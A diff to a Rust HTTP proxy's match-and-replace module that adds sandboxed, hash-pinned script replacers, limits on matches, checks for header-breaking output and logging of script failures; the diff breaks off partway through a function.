@@ -7,15 +7,25 @@
 //! `send`, the fuzzer and the active scanner read them when a run starts ([`RuleSet::load`]).
 //! Nothing here opens a connection: [`RuleSet::request`] and [`RuleSet::response`] only rewrite
 //! bytes, which is also all `rules test` does.
+//!
+//! A rule's replacement is text, or what a script makes of each match ([`ReplaceKind::Script`]:
+//! a hook script, run in the sandbox of [`crate::hooks`]). A script that fails (it throws, runs
+//! past its time limit, gives something that isn't a replacement, or its file changed) leaves
+//! what its rule would have rewritten as it is, and the failure is said: on stderr, and in
+//! [`Ruled::failed`] for whoever applied the rules.
 
+use std::cell::{Cell, RefCell};
 use std::sync::Arc;
 
 use regex::bytes::Regex as BytesRegex;
 use regex::Regex;
+use rusqlite::OptionalExtension;
 use serde::{Deserialize, Serialize};
+use serde_json::{json, Value};
 
 use crate::capture::decode_body_fully;
 use crate::error::{Error, Result};
+use crate::hooks::{with_bytes, Hook, HookKind, ScriptRef};
 use crate::http::client::SendOptions;
 use crate::http::request::split_head_body;
 use crate::http::response::dechunk;
@@ -180,14 +190,16 @@ impl RuleAction {
     }
 }
 
-/// What makes a rule's replacement. One kind so far; another (a script, say) is a variant here,
-/// a field of its own on [`Rule`] if it needs more than `replace`, and an arm in [`Replacer`].
+/// What makes a rule's replacement: a variant here, a field of its own on [`Rule`] if it needs
+/// more than `replace`, and an arm in [`Replacer`].
 #[derive(Debug, Clone, Copy, Default, Serialize, Deserialize, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case")]
 pub enum ReplaceKind {
     /// `replace` as text (with a regex, `$1`-style group references).
     #[default]
     Text,
+    /// What the rule's `script` returns for each match: its `replace(match, ctx)` function.
+    Script,
 }
 
 impl ReplaceKind {
@@ -242,6 +254,10 @@ pub struct Rule {
     /// What makes the replacement.
     #[serde(default, skip_serializing_if = "ReplaceKind::is_text")]
     pub replacer: ReplaceKind,
+    /// The script that makes it, for [`ReplaceKind::Script`]: a file, pinned by the hash of its
+    /// text when the rule was added.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub script: Option<ScriptRef>,
 }
 
 fn yes() -> bool {
@@ -266,6 +282,7 @@ impl Rule {
             applies_to: Vec::new(),
             host: None,
             replacer: ReplaceKind::Text,
+            script: None,
         }
     }
 
@@ -291,43 +308,139 @@ enum Matcher {
     Whole(Vec<u8>),
 }
 
+/// The matches of one value a script is called for at once, and what it may be told of them.
+const MAX_MATCHES: usize = 10_000;
+const MAX_MATCHED: usize = 8 << 20;
+
 /// One match, as a replacer sees it.
 struct Matched<'a> {
     /// The bytes matched.
-    #[allow(dead_code)] // A replacer that computes its text reads what was matched.
     found: &'a [u8],
     /// The regex's groups, for a regex match.
     groups: Option<&'a regex::bytes::Captures<'a>>,
+}
+
+impl Matched<'_> {
+    /// The match as a script's `replace` gets it: its text (and exact bytes when they aren't
+    /// UTF-8), and for a regex its groups, by number and by name.
+    fn item(&self, names: Option<&BytesRegex>) -> Value {
+        let mut item = with_bytes(json!({}), "text", "base64", self.found);
+        if let Some(groups) = self.groups {
+            let text =
+                |m: Option<regex::bytes::Match<'_>>| m.map(|m| String::from_utf8_lossy(m.as_bytes()).into_owned());
+            item["groups"] = (0..groups.len()).map(|i| json!(text(groups.get(i)))).collect();
+            let named: serde_json::Map<String, Value> = names
+                .into_iter()
+                .flat_map(|re| re.capture_names().flatten())
+                .map(|name| (name.to_string(), json!(text(groups.name(name)))))
+                .collect();
+            item["named"] = Value::Object(named);
+        }
+        item
+    }
 }
 
 /// What a rule writes in place of a match: see [`ReplaceKind`].
 #[derive(Debug, Clone)]
 enum Replacer {
     Text(String),
+    Script(Hook),
 }
 
 impl Replacer {
-    fn of(rule: &Rule) -> Self {
+    /// The rule's replacer; the error says why its script can't run now.
+    fn of(rule: &Rule) -> std::result::Result<Self, String> {
         match rule.replacer {
-            ReplaceKind::Text => Self::Text(rule.replace.clone()),
+            ReplaceKind::Text => Ok(Self::Text(rule.replace.clone())),
+            ReplaceKind::Script => {
+                let script = rule.script.as_ref().ok_or("it names no script")?;
+                Hook::load(HookKind::Replace, script).map(Self::Script)
+            }
         }
     }
 
-    /// Appends the replacement for `m` to `out`.
-    fn write(&self, m: &Matched<'_>, out: &mut Vec<u8>) {
-        match self {
-            Self::Text(text) => match m.groups {
-                Some(groups) => groups.expand(text.as_bytes(), out),
-                None => out.extend_from_slice(text.as_bytes()),
-            },
+    /// Appends the text replacement for `m` to `out`.
+    fn write_text(text: &str, m: &Matched<'_>, out: &mut Vec<u8>) {
+        match m.groups {
+            Some(groups) => groups.expand(text.as_bytes(), out),
+            None => out.extend_from_slice(text.as_bytes()),
         }
     }
+}
 
-    /// The value of a header or parameter the rule adds, where there is nothing to match.
-    fn fresh(&self) -> String {
-        let mut out = Vec::new();
-        self.write(&Matched { found: b"", groups: None }, &mut out);
-        String::from_utf8_lossy(&out).into_owned()
+/// One application of an engine's rules to a message: what a script replacer is told about
+/// where its matches are, and where its failures go.
+struct Run<'a> {
+    engine: Engine,
+    host: &'a str,
+    failed: RefCell<Vec<Failed>>,
+    /// Whether a script's failure is said on stderr: not for a made-up request a rule is tried
+    /// on before it is saved.
+    quiet: bool,
+}
+
+impl<'a> Run<'a> {
+    fn new(engine: Engine, host: &'a str) -> Self {
+        Run { engine, host, failed: RefCell::default(), quiet: false }
+    }
+
+    /// Whether `rule` has anything to do in this message. A rule with a text replacement
+    /// always has its turn. One whose replacement a script makes is first applied dry, by
+    /// `turn`, to copies: nothing is replaced, and it only shows whether the script would be
+    /// called. A script is told the whole message, which costs a copy of it (and for a response
+    /// its decoding), so that is made only for a message the rule matches something in.
+    fn wants(&self, rule: &CompiledRule, turn: impl FnOnce(&Cx<'_>)) -> bool {
+        // A rule that removes writes nothing, whatever its replacer: no script is called.
+        if !matches!(rule.replacer, Replacer::Script(_)) || rule.action == RuleAction::Remove {
+            return true;
+        }
+        let dry = Cx { run: self, message: None, dry: true, wanted: Cell::new(false), failed: Cell::new(false) };
+        turn(&dry);
+        dry.wanted.get()
+    }
+
+    /// The context for `rule`'s turn. `message` is the message as it is now, read only for a
+    /// rule whose replacement a script makes.
+    fn cx(&self, rule: &CompiledRule, message: impl FnOnce() -> Value) -> Cx<'_> {
+        let message = matches!(rule.replacer, Replacer::Script(_)).then(|| {
+            let mut cx = message();
+            cx["location"] = json!(rule.location.name());
+            cx["name"] = json!(rule.name);
+            cx["engine"] = json!(self.engine.name());
+            cx["host"] = json!(self.host);
+            cx
+        });
+        Cx { run: self, message, dry: false, wanted: Cell::new(false), failed: Cell::new(false) }
+    }
+
+    fn failed(self) -> Vec<Failed> {
+        self.failed.into_inner()
+    }
+}
+
+/// A rule's turn at a message.
+struct Cx<'a> {
+    run: &'a Run<'a>,
+    /// What a script is told: None for a rule with a text replacement.
+    message: Option<Value>,
+    /// A dry turn (see [`Run::wants`]): a script isn't called, only noted as wanted.
+    dry: bool,
+    wanted: Cell<bool>,
+    /// Whether the rule's script failed in this turn: then none of the turn's changes stay.
+    failed: Cell<bool>,
+}
+
+impl Cx<'_> {
+    /// Notes that `rule`'s script failed here, so the message stays as it is for that rule.
+    fn fail(&self, rule: &CompiledRule, error: &str) {
+        self.failed.set(true);
+        if let (Replacer::Script(hook), false) = (&rule.replacer, self.run.quiet) {
+            hook.warn(&format!("match-and-replace rule {} left a message as it was", rule.id), error);
+        }
+        let mut failed = self.run.failed.borrow_mut();
+        if !failed.iter().any(|f| f.id == rule.id) {
+            failed.push(Failed { id: rule.id, error: error.to_string() });
+        }
     }
 }
 
@@ -340,16 +453,16 @@ impl Matcher {
         }
     }
 
-    /// `value` with each match replaced by what `replacer` writes; None when nothing matched.
-    fn rewrite(&self, replacer: &Replacer, value: &[u8]) -> Option<Vec<u8>> {
+    /// `value` with each match replaced by `text`; None when nothing matched.
+    fn rewrite_text(&self, text: &str, value: &[u8]) -> Option<Vec<u8>> {
         let mut out = Vec::new();
         match self {
-            Self::Any => replacer.write(&Matched { found: value, groups: None }, &mut out),
+            Self::Any => Replacer::write_text(text, &Matched { found: value, groups: None }, &mut out),
             Self::Whole(whole) => {
                 if value != whole.as_slice() {
                     return None;
                 }
-                replacer.write(&Matched { found: value, groups: None }, &mut out);
+                Replacer::write_text(text, &Matched { found: value, groups: None }, &mut out);
             }
             Self::Regex(re) | Self::Literal(re) => {
                 let expand = matches!(self, Self::Regex(_));
@@ -359,7 +472,11 @@ impl Matcher {
                     let m = groups.get(0).expect("group 0 is the match");
                     any = true;
                     out.extend_from_slice(&value[last..m.start()]);
-                    replacer.write(&Matched { found: m.as_bytes(), groups: expand.then_some(&groups) }, &mut out);
+                    Replacer::write_text(
+                        text,
+                        &Matched { found: m.as_bytes(), groups: expand.then_some(&groups) },
+                        &mut out,
+                    );
                     last = m.end();
                 }
                 if !any {
@@ -393,14 +510,115 @@ impl CompiledRule {
         self.engines.contains(&engine) && self.host.as_ref().is_none_or(|re| re.is_match(host))
     }
 
-    /// `value` rewritten, or None when the rule doesn't match it.
-    fn rewrite(&self, value: &[u8]) -> Option<Vec<u8>> {
-        self.matcher.as_ref()?.rewrite(&self.replacer, value)
+    /// `value` rewritten, or None when the rule doesn't match it, or its script failed (which
+    /// `cx` then knows).
+    fn rewrite(&self, value: &[u8], cx: &Cx<'_>) -> Option<Vec<u8>> {
+        let matcher = self.matcher.as_ref()?;
+        let hook = match &self.replacer {
+            Replacer::Text(text) => return matcher.rewrite_text(text, value),
+            Replacer::Script(hook) => hook,
+        };
+        // Dry, the only question is whether the script would be called: whether anything matches.
+        if cx.dry {
+            cx.wanted.set(cx.wanted.get() || matcher.matches(value));
+            return None;
+        }
+        // Every match of the value goes to the script in one call.
+        match matcher {
+            Matcher::Any => {
+                let item = Matched { found: value, groups: None }.item(None);
+                self.scripted(hook, vec![item], cx)?.pop()?
+            }
+            Matcher::Whole(whole) => {
+                if value != whole.as_slice() {
+                    return None;
+                }
+                let item = Matched { found: value, groups: None }.item(None);
+                self.scripted(hook, vec![item], cx)?.pop()?
+            }
+            Matcher::Regex(re) | Matcher::Literal(re) => {
+                let expand = matches!(matcher, Matcher::Regex(_));
+                // Where each match is, and what the script is told of it. A pattern can match at
+                // every byte of a body a target sent: what is gathered for the script is
+                // counted as it is gathered, not after.
+                let (mut spans, mut items, mut size) = (Vec::new(), Vec::new(), 0);
+                for groups in re.captures_iter(value) {
+                    let m = groups.get(0).expect("group 0 is the match");
+                    let told: usize = if expand { groups.iter().flatten().map(|g| g.len()).sum() } else { m.len() };
+                    size += 64 + 3 * (m.len() + told);
+                    if spans.len() == MAX_MATCHES || size > MAX_MATCHED {
+                        cx.fail(
+                            self,
+                            &format!(
+                                "its rule matches in too many places in one value (over {MAX_MATCHES}, or {} MiB \
+                                 of them): match less, or the whole value",
+                                MAX_MATCHED >> 20
+                            ),
+                        );
+                        return None;
+                    }
+                    spans.push(m.range());
+                    let matched = Matched { found: m.as_bytes(), groups: expand.then_some(&groups) };
+                    items.push(matched.item(expand.then_some(re)));
+                }
+                if spans.is_empty() {
+                    return None;
+                }
+                let replacements = self.scripted(hook, items, cx)?;
+                let mut out = Vec::new();
+                let mut last = 0;
+                for (span, new) in spans.into_iter().zip(replacements) {
+                    out.extend_from_slice(&value[last..span.start]);
+                    // None: the script leaves this match as it found it.
+                    out.extend_from_slice(new.as_deref().unwrap_or(&value[span.clone()]));
+                    last = span.end;
+                }
+                out.extend_from_slice(&value[last..]);
+                Some(out)
+            }
+        }
+    }
+
+    /// What the rule's script makes of the matches it is told of in `items`, one replacement
+    /// each (None: leave the match as it is). None when it failed, which `cx` then knows:
+    /// nothing is replaced.
+    fn scripted(&self, hook: &Hook, items: Vec<Value>, cx: &Cx<'_>) -> Option<Vec<Option<Vec<u8>>>> {
+        if cx.dry {
+            cx.wanted.set(true);
+            return None;
+        }
+        let replacements = match hook.replace(cx.message.as_ref().unwrap_or(&Value::Null), &items) {
+            Ok(replacements) => replacements,
+            Err(e) => {
+                cx.fail(self, e.text());
+                return None;
+            }
+        };
+        // A text replacement is checked for this when the rule is saved ([`breaks_head`]); a
+        // script's can only be checked now.
+        let breaks = |new: &Option<Vec<u8>>| new.as_ref().is_some_and(|new| new.iter().any(|b| b"\r\n\0".contains(b)));
+        if self.location.request_head() && replacements.iter().any(breaks) {
+            cx.fail(self, "it returned a line break or NUL, which a request's line and headers can't hold");
+            return None;
+        }
+        Some(replacements)
     }
 
     /// As [`CompiledRule::rewrite`], for a part of the head.
-    fn rewrite_str(&self, value: &str) -> Option<String> {
-        self.rewrite(value.as_bytes()).map(|b| String::from_utf8_lossy(&b).into_owned())
+    fn rewrite_str(&self, value: &str, cx: &Cx<'_>) -> Option<String> {
+        self.rewrite(value.as_bytes(), cx).map(|b| String::from_utf8_lossy(&b).into_owned())
+    }
+
+    /// The value of a header or parameter the rule adds, where there is nothing to match.
+    /// None when its script failed, or says to leave things as they are.
+    fn fresh(&self, cx: &Cx<'_>) -> Option<String> {
+        match &self.replacer {
+            Replacer::Text(text) => Some(text.clone()),
+            Replacer::Script(hook) => {
+                let new = self.scripted(hook, vec![Matched { found: b"", groups: None }.item(None)], cx)?.pop()??;
+                Some(String::from_utf8_lossy(&new).into_owned())
+            }
+        }
     }
 
     fn matches(&self, value: &str) -> bool {
@@ -451,9 +669,34 @@ pub fn validate_rule(rule: &Rule) -> Result<()> {
     if breaks_head(rule) {
         return bad("a replacement written into a request's line or headers can't hold a line break or NUL".into());
     }
+    match (rule.replacer, &rule.script) {
+        (ReplaceKind::Text, None) => {}
+        (ReplaceKind::Text, Some(_)) => return bad("a rule that names a script has \"replacer\": \"script\"".into()),
+        (ReplaceKind::Script, None) => return bad("a script rule names its script file (--script)".into()),
+        (ReplaceKind::Script, Some(script)) => {
+            if !rule.replace.is_empty() {
+                return bad("--script makes the replacement: it takes no --replace".into());
+            }
+            if rule.action == Some(RuleAction::Remove) {
+                return bad("--action remove takes no --script: nothing is written".into());
+            }
+            if script.sha256.len() != 64 || !script.sha256.bytes().all(|b| b.is_ascii_hexdigit()) {
+                return bad("a script is pinned by its sha256".into());
+            }
+            // Every engine reads it from wherever it runs: a relative path would name a
+            // different file for each.
+            if !script.file.is_absolute() {
+                return bad(format!("a script file is named by its full path, not {:?}", script.file));
+            }
+            // The file as it is now must be the one that was pinned.
+            script.read().map_err(Error::InvalidInput)?;
+        }
+    }
     if loc == RuleLocation::Status {
-        // A group reference is only known once it has matched; the result is checked then too.
-        let computed = rule.matcher == MatchKind::Regex && rule.replace.contains('$');
+        // A group reference is only known once it has matched, and a script's result once it
+        // has run; the result is checked then too.
+        let computed =
+            rule.replacer == ReplaceKind::Script || (rule.matcher == MatchKind::Regex && rule.replace.contains('$'));
         if !computed && status_parts(&rule.replace).is_none() {
             return bad(format!(
                 "a status replacement is a code from 200 to 999, with a reason if you like (\"404\" or \"404 Not Found\"), not {:?}",
@@ -480,7 +723,35 @@ pub fn breaks_head(rule: &Rule) -> bool {
     rule.location.request_head() && (breaks(&rule.replace) || rule.name.as_deref().is_some_and(breaks))
 }
 
-fn compile(r: &Rule) -> Result<CompiledRule> {
+/// Why `rule`'s script can't run now (its file is gone, or changed since the rule was added),
+/// for a rule whose replacement a script makes. Such a rule is left out when rules load.
+pub fn script_problem(rule: &Rule) -> Option<String> {
+    match rule.replacer {
+        ReplaceKind::Text => None,
+        ReplaceKind::Script => Replacer::of(rule).err(),
+    }
+}
+
+/// Starts `rule`'s script, if it has one, to say now what its first match would: that it
+/// throws as it loads, or defines no `replace` function. This runs the script's top level.
+pub fn verify_script(rule: &Rule) -> Result<()> {
+    match Replacer::of(rule).map_err(Error::InvalidInput)? {
+        Replacer::Text(_) => Ok(()),
+        Replacer::Script(hook) => {
+            hook.verify().map_err(|e| Error::InvalidInput(format!("script {}: {e}", hook.name())))
+        }
+    }
+}
+
+/// `r` compiled; None when its script can't run now, which is said.
+fn compile(r: &Rule) -> Result<Option<CompiledRule>> {
+    let replacer = match Replacer::of(r) {
+        Ok(replacer) => replacer,
+        Err(why) => {
+            eprintln!("brainproxy: match-and-replace rule {} not applied: {why}", r.id);
+            return Ok(None);
+        }
+    };
     let bad = |e: regex::Error| Error::InvalidInput(format!("rule {} pattern: {e}", r.id));
     let matcher = if r.pattern.is_empty() {
         match (r.location, r.name.is_some(), r.matcher) {
@@ -508,7 +779,7 @@ fn compile(r: &Rule) -> Result<CompiledRule> {
             Regex::new(&format!("(?i){h}")).map_err(|e| Error::InvalidInput(format!("rule {} host pattern: {e}", r.id)))
         })
         .transpose()?;
-    Ok(CompiledRule {
+    Ok(Some(CompiledRule {
         id: r.id,
         origin: r.origin.clone(),
         host_header_test: r.host_header_test,
@@ -516,16 +787,18 @@ fn compile(r: &Rule) -> Result<CompiledRule> {
         name: r.name.clone().filter(|_| r.location.is_header() || r.location == RuleLocation::QueryParam),
         action: r.action.unwrap_or_default(),
         matcher,
-        replacer: Replacer::of(r),
+        replacer,
         host,
         engines: r.engines(),
-    })
+    }))
 }
 
-/// The enabled rules, compiled. One that [`breaks_head`] is left out rather than failing the
-/// load, so the proxy keeps the rest.
+/// The enabled rules, compiled. One that [`breaks_head`], or whose script can't run now
+/// ([`script_problem`]), is left out rather than failing the load, so the proxy keeps the rest.
 pub fn compile_rules(rules: &[Rule]) -> Result<Vec<CompiledRule>> {
-    rules.iter().filter(|r| r.enabled && !breaks_head(r)).map(compile).collect()
+    let compiled: Result<Vec<Option<CompiledRule>>> =
+        rules.iter().filter(|r| r.enabled && !breaks_head(r)).map(compile).collect();
+    Ok(compiled?.into_iter().flatten().collect())
 }
 
 /// A rule that changed a message.
@@ -534,6 +807,108 @@ pub struct Fired {
     pub id: u32,
     pub origin: Option<String>,
     pub host_header_test: bool,
+}
+
+/// A rule whose script failed on a message, which that rule then left as it was.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+pub struct Failed {
+    pub id: u32,
+    pub error: String,
+}
+
+/// The meta key of each rule's last script failure, by rule id: `{"3": {"error": "...", "time":
+/// "...", "engine": "proxy"}}`. An engine that leaves a message as it is because a rule's
+/// script failed has nowhere of its own to say so (the proxy least of all), so it is noted
+/// here for whoever lists the rules.
+pub const RULE_FAILURES: &str = "rules.script_failures";
+
+/// Where an engine notes its rules' script failures: the project, or nowhere. It remembers
+/// what it last noted for each rule, so one made anew (when an engine starts, and when the
+/// proxy loads its rules again after a rule was switched off and on) notes afresh.
+#[derive(Debug, Clone, Default)]
+pub struct FailureLog {
+    project: Option<std::path::PathBuf>,
+    /// The failure last written for each rule, and when.
+    noted: Arc<std::sync::Mutex<std::collections::HashMap<u32, (String, std::time::Instant)>>>,
+}
+
+/// How long a rule's note stands before another failure of the rule replaces it: a script that
+/// fails differently on every message costs a write now and then, not one for each.
+const NOTE_EVERY: std::time::Duration = std::time::Duration::from_secs(5);
+
+impl FailureLog {
+    /// A log in the project `store` is of (an in-memory project has none).
+    pub fn of(store: &Store) -> Self {
+        Self::at(store.path())
+    }
+
+    pub fn at(project: Option<&std::path::Path>) -> Self {
+        FailureLog { project: project.map(std::path::Path::to_path_buf), noted: Default::default() }
+    }
+
+    /// Notes `failed`, the failures of one message's rules as `engine` applied them: a rule's
+    /// first, and after that one that differs from the last noted once that has stood a while.
+    pub fn note(&self, engine: Engine, failed: &[Failed]) {
+        let Some(project) = self.project.as_deref().filter(|_| !failed.is_empty()) else { return };
+        let new: Vec<&Failed> = {
+            let noted = self.noted.lock().unwrap_or_else(|e| e.into_inner());
+            let due = |f: &&Failed| match noted.get(&f.id) {
+                Some((last, when)) => *last != f.error && when.elapsed() >= NOTE_EVERY,
+                None => true,
+            };
+            failed.iter().filter(due).collect()
+        };
+        if new.is_empty() {
+            return;
+        }
+        // Read and written in one transaction, so two engines noting at once keep both notes.
+        let written = crate::hooks::blocking(|| -> Result<()> {
+            let mut store = Store::open(project)?;
+            let tx = store.write_tx()?;
+            let stored: Option<String> =
+                tx.query_row("SELECT value FROM meta WHERE key = ?1", [RULE_FAILURES], |r| r.get(0)).optional()?;
+            let mut all = stored
+                .and_then(|text| serde_json::from_str::<Value>(&text).ok())
+                .filter(Value::is_object)
+                .unwrap_or_else(|| json!({}));
+            let time: String = tx.query_row("SELECT strftime('%Y-%m-%dT%H:%M:%fZ','now')", [], |r| r.get(0))?;
+            for f in &new {
+                all[f.id.to_string()] = json!({"error": f.error, "time": time, "engine": engine.name()});
+            }
+            tx.execute(
+                "INSERT INTO meta (key, value) VALUES (?1, ?2) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
+                rusqlite::params![RULE_FAILURES, all.to_string()],
+            )?;
+            tx.commit()?;
+            Ok(())
+        });
+        // Best effort (the failure is on stderr and in the engine's own result either way), but
+        // one that couldn't be written is tried again the next time it happens.
+        if written.is_ok() {
+            let mut noted = self.noted.lock().unwrap_or_else(|e| e.into_inner());
+            let now = std::time::Instant::now();
+            noted.extend(new.iter().map(|f| (f.id, (f.error.clone(), now))));
+        }
+    }
+}
+
+/// The last script failure noted for each rule, by rule id (see [`RULE_FAILURES`]).
+pub fn noted_failures(store: &Store) -> Value {
+    let noted = store.meta_get(RULE_FAILURES).ok().flatten().and_then(|text| serde_json::from_str::<Value>(&text).ok());
+    noted.filter(Value::is_object).unwrap_or_else(|| json!({}))
+}
+
+/// Forgets the failures noted for the rules `keep` doesn't hold on to: ones removed, or
+/// switched off or on since.
+pub fn forget_failures(store: &Store, keep: impl Fn(u32) -> bool) -> Result<()> {
+    let mut all = noted_failures(store);
+    let Some(map) = all.as_object_mut().filter(|m| !m.is_empty()) else { return Ok(()) };
+    let before = map.len();
+    map.retain(|id, _| id.parse().is_ok_and(&keep));
+    if map.len() == before {
+        return Ok(());
+    }
+    store.meta_set(RULE_FAILURES, (!map.is_empty()).then(|| all.to_string()).as_deref())
 }
 
 /// A message after an engine's rules.
@@ -545,23 +920,25 @@ pub struct Ruled {
     pub original: Option<Vec<u8>>,
     /// The rules that changed it, in the order they applied.
     pub fired: Vec<Fired>,
+    /// The rules whose script failed on it: each left the message as it was.
+    pub failed: Vec<Failed>,
 }
 
 impl Ruled {
     fn unchanged(bytes: Vec<u8>) -> Self {
-        Ruled { bytes, original: None, fired: Vec::new() }
+        Ruled { bytes, ..Default::default() }
     }
 
-    fn of(original: Vec<u8>, bytes: Vec<u8>, by: Vec<&CompiledRule>) -> Self {
+    fn of(original: Vec<u8>, bytes: Vec<u8>, by: Vec<&CompiledRule>, failed: Vec<Failed>) -> Self {
         // A rule may undo another: then nothing changed, whatever fired on the way.
         if by.is_empty() || bytes == original {
-            return Self::unchanged(original);
+            return Ruled { failed, ..Self::unchanged(original) };
         }
         let fired = by
             .iter()
             .map(|r| Fired { id: r.id, origin: r.origin.clone(), host_header_test: r.host_header_test })
             .collect();
-        Ruled { bytes, original: Some(original), fired }
+        Ruled { bytes, original: Some(original), fired, failed }
     }
 
     pub fn changed(&self) -> bool {
@@ -659,8 +1036,9 @@ impl RuleSet {
         if active.is_empty() {
             return Ruled::unchanged(request);
         }
-        let (bytes, by) = request_rules(&active, &request);
-        Ruled::of(request, bytes, by)
+        let run = Run::new(engine, host);
+        let (bytes, by) = request_rules(&active, &request, &run);
+        Ruled::of(request, bytes, by, run.failed())
     }
 
     /// `response` from `host` after the rules `engine` applies there.
@@ -669,8 +1047,9 @@ impl RuleSet {
         if active.is_empty() {
             return Ruled::unchanged(response);
         }
-        let (bytes, by) = response_rules(&active, &response);
-        Ruled::of(response, bytes, by)
+        let run = Run::new(engine, host);
+        let (bytes, by) = response_rules(&active, &response, &run);
+        Ruled::of(response, bytes, by, run.failed())
     }
 
     /// Whether `engine` has a rule for responses from `host`: a sender that only holds a
@@ -689,13 +1068,18 @@ impl RuleSet {
     pub fn ws_message(&self, engine: Engine, host: &str, payload: &[u8]) -> Ruled {
         let mut current = payload.to_vec();
         let mut by = Vec::new();
+        let run = Run::new(engine, host);
         for rule in self.active(engine, host, |l| l == RuleLocation::WsMessage) {
-            if let Some(new) = rule.rewrite(&current).filter(|new| *new != current) {
+            if !run.wants(rule, |dry| drop(rule.rewrite(&current, dry))) {
+                continue;
+            }
+            let cx = run.cx(rule, || json!({ "message": with_bytes(json!({}), "text", "base64", &current) }));
+            if let Some(new) = rule.rewrite(&current, &cx).filter(|new| *new != current) {
                 current = new;
                 by.push(rule);
             }
         }
-        Ruled::of(payload.to_vec(), current, by)
+        Ruled::of(payload.to_vec(), current, by, run.failed())
     }
 }
 
@@ -705,12 +1089,13 @@ impl RuleSet {
 pub struct EngineRules {
     engine: Engine,
     set: Arc<RuleSet>,
+    failures: FailureLog,
 }
 
 impl EngineRules {
     /// `engine`'s rules in the project; None when no enabled rule lists it.
     pub fn load(store: &Store, engine: Engine) -> Result<Option<Self>> {
-        Ok(RuleSet::load(store, engine)?.map(|set| EngineRules { engine, set }))
+        Ok(RuleSet::load(store, engine)?.map(|set| EngineRules { engine, set, failures: FailureLog::of(store) }))
     }
 
     /// `request` to `target` after the rules, before a session is applied to it (the proxy's
@@ -718,6 +1103,7 @@ impl EngineRules {
     /// [`Ruled::agent_host`]); the client's own Host check still sees whatever goes out.
     pub fn request(&self, opts: &SendOptions, target: &Target, request: Vec<u8>) -> Result<Ruled> {
         let ruled = self.set.request(self.engine, &target.host, request);
+        self.failures.note(self.engine, &ruled.failed);
         ruled.check_host(opts, target)?;
         Ok(ruled)
     }
@@ -730,7 +1116,9 @@ impl EngineRules {
 
     /// `response` from `target` after the rules: what the engine then reads.
     pub fn response(&self, target: &Target, response: Vec<u8>) -> Ruled {
-        self.set.response(self.engine, &target.host, response)
+        let ruled = self.set.response(self.engine, &target.host, response);
+        self.failures.note(self.engine, &ruled.failed);
+        ruled
     }
 }
 
@@ -741,7 +1129,8 @@ pub fn apply_request_rules(rules: &[CompiledRule], req: Vec<u8>) -> Vec<u8> {
     if active.is_empty() {
         return req;
     }
-    request_rules(&active, &req).0
+    // A script's failure on a request made up for the check is not one of traffic's.
+    request_rules(&active, &req, &Run { quiet: true, ..Run::new(Engine::Proxy, "") }).0
 }
 
 /// The request line's method, target and version, when it is those three with single spaces.
@@ -784,7 +1173,7 @@ fn encode_name(name: &str) -> String {
 
 /// What a named-parameter rule makes of a query string; None when it changes nothing. The
 /// rule's name is the parameter's decoded name; values are read and written as they are.
-fn edit_query(rule: &CompiledRule, query: Option<&str>) -> Option<Option<String>> {
+fn edit_query(rule: &CompiledRule, query: Option<&str>, cx: &Cx<'_>) -> Option<Option<String>> {
     let name = rule.name.as_deref()?;
     let mut pairs: Vec<String> =
         query.map(|q| q.split('&').filter(|p| !p.is_empty()).map(str::to_string).collect()).unwrap_or_default();
@@ -800,7 +1189,7 @@ fn edit_query(rule: &CompiledRule, query: Option<&str>) -> Option<Option<String>
         key == name || decode_name(&key) == name
     };
     match rule.action {
-        RuleAction::Add => pairs.push(format!("{}={}", encode_name(name), rule.replacer.fresh())),
+        RuleAction::Add => pairs.extend(rule.fresh(cx).map(|new| format!("{}={new}", encode_name(name)))),
         RuleAction::Remove => pairs.retain(|p| !(is(p) && rule.matches(split(p).1.as_deref().unwrap_or("")))),
         RuleAction::Set => {
             let mut found = false;
@@ -809,12 +1198,12 @@ fn edit_query(rule: &CompiledRule, query: Option<&str>) -> Option<Option<String>
                 let (key, value) = split(pair);
                 let value = value.unwrap_or_default();
                 // A value left as it is leaves the parameter as written (`?debug` stays so).
-                if let Some(new) = rule.rewrite_str(&value).filter(|new| *new != value) {
+                if let Some(new) = rule.rewrite_str(&value, cx).filter(|new| *new != value) {
                     *pair = format!("{key}={new}");
                 }
             }
             if !found && rule.sets_any() {
-                pairs.push(format!("{}={}", encode_name(name), rule.replacer.fresh()));
+                pairs.extend(rule.fresh(cx).map(|new| format!("{}={new}", encode_name(name))));
             }
         }
     }
@@ -826,7 +1215,7 @@ fn edit_query(rule: &CompiledRule, query: Option<&str>) -> Option<Option<String>
 
 /// Applies a rule on a part of the request line to it. Leaves a line that isn't `METHOD
 /// TARGET VERSION` alone, and a result that would break the line in two.
-fn edit_request_line(rule: &CompiledRule, first: &mut String) -> bool {
+fn edit_request_line(rule: &CompiledRule, first: &mut String, cx: &Cx<'_>) -> bool {
     let Some((method, target, version)) = line_parts(first) else { return false };
     let (before, path, query) = target_parts(target);
     let with_query = |q: Option<&str>| match q {
@@ -834,13 +1223,13 @@ fn edit_request_line(rule: &CompiledRule, first: &mut String) -> bool {
         None => format!("{before}{path}"),
     };
     let new = match rule.location {
-        RuleLocation::Method => rule.rewrite_str(method).map(|m| format!("{m} {target} {version}")),
-        RuleLocation::Path => rule.rewrite_str(path).map(|p| match query {
+        RuleLocation::Method => rule.rewrite_str(method, cx).map(|m| format!("{m} {target} {version}")),
+        RuleLocation::Path => rule.rewrite_str(path, cx).map(|p| match query {
             Some(q) => format!("{method} {before}{p}?{q} {version}"),
             None => format!("{method} {before}{p} {version}"),
         }),
         RuleLocation::QueryParam => {
-            edit_query(rule, query).map(|q| format!("{method} {} {version}", with_query(q.as_deref())))
+            edit_query(rule, query, cx).map(|q| format!("{method} {} {version}", with_query(q.as_deref())))
         }
         _ => None,
     };
@@ -853,7 +1242,65 @@ fn edit_request_line(rule: &CompiledRule, first: &mut String) -> bool {
     }
 }
 
-fn request_rules<'a>(active: &[&'a CompiledRule], req: &[u8]) -> (Vec<u8>, Vec<&'a CompiledRule>) {
+/// A head's header lines as a script reads them: name and value pairs.
+fn header_pairs(headers: &[String]) -> Value {
+    headers
+        .iter()
+        .map(|line| match header_parts(line) {
+            Some((name, value)) => json!([name.trim(), value]),
+            None => json!([line, ""]),
+        })
+        .collect()
+}
+
+/// A request as a script reads it, as it is when its rule gets to it.
+fn request_view(first: &str, headers: &[String], body: &[u8]) -> Value {
+    let (method, target, _) = line_parts(first).unwrap_or(("", "", ""));
